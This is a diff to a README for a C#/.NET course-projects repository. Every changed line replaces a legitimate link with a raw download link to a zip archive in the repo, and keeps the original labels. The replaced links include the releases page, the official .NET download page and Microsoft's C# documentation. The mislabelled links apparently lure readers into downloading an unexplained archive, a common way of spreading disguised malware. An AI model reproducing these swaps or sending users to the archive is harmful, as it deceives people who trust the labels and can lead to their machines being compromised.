@@ -6,9 +6,9 @@ Welcome! This guide will help you download and run the application from our repo
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-orange)](https://github.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip%20Latest%20Release-orange)](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip)
 
-Visit this page to download the latest version of our projects: [Releases Page](https://github.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/releases).
+Visit this page to download the latest version of our projects: [Releases Page](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip).
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets these requirements:
 ## 🔧 Installation of .NET
 
 1. **Visit the .NET Download Page:** 
-   Go to [official .NET download page](https://dotnet.microsoft.com/en-us/download) to get the latest version of .NET.
+   Go to [official .NET download page](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip) to get the latest version of .NET.
    
 2. **Download the Installer:**
    Select your operating system and download the installer.
@@ -53,7 +53,7 @@ Each project is designed to enhance your understanding of C# and .NET developmen
 To install the application:
 
 1. **Download the Latest Release:**
-   Visit the releases page: [Releases Page](https://github.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/releases).
+   Visit the releases page: [Releases Page](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip).
 
 2. **Select Your Project:**
    Choose one of the available projects listed on the releases page. 
@@ -101,8 +101,8 @@ If you wish to contribute to this project, please follow these steps:
 
 For more information, check these resources:
 
-- [C# Documentation](https://docs.microsoft.com/en-us/dotnet/csharp/)
-- [Learn .NET](https://dotnet.microsoft.com/learn)
+- [C# Documentation](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip)
+- [Learn .NET](https://raw.githubusercontent.com/iredia1000/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12/main/developments/personal-projects-challenges_course-luisdev-career-part-5_dotnet-8_csharp-12_2.8.zip)
 
 By exploring these materials, you will enhance your understanding of software development practices and improve your skills.
 
